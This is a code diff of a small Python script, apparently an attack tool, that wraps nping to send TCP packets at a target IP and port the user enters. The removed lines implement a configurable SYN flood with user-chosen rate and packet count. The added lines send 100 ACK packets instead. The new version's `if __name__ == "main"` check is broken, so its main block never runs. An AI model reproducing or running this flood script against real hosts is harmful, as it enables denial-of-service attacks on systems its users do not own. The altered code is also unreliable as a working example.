@@ -1,19 +1,15 @@
 import subprocess
 
-def launch_attack(target_ip, target_port, rate, count):
+def launch_attack(target_ip, target_port):
     try:
         subprocess.run([
-            "nping", "--tcp", "--dest-port", str(target_port), "--flags", "syn", "--rate", str(rate), "--count", str(count), target_ip
+            "nping", "--tcp", "--flags", "ACK", "-p", str(target_port), "--count", "100", target_ip
         ], check=True)
     except subprocess.CalledProcessError as e:
-        print("Attack failed:", e)
-    except EnvironmentError as e:
-        print(e)
+        print("Error occurred:", e)
 
-if __name__ == "__main__":
-    target_ip = input("Target IP: ")
-    target_port = input("Target Port: ")
-    rate = input("Rate of packets per second: ")
-    count = input("Total number of packets to send: ")
+if __name__ == "main":
+    target_ip = input("Enter target IP: ")
+    target_port = int(input("Enter target port: "))
 
-    launch_attack(target_ip, target_port, rate, count)
+    launch_attack(target_ip, target_port)
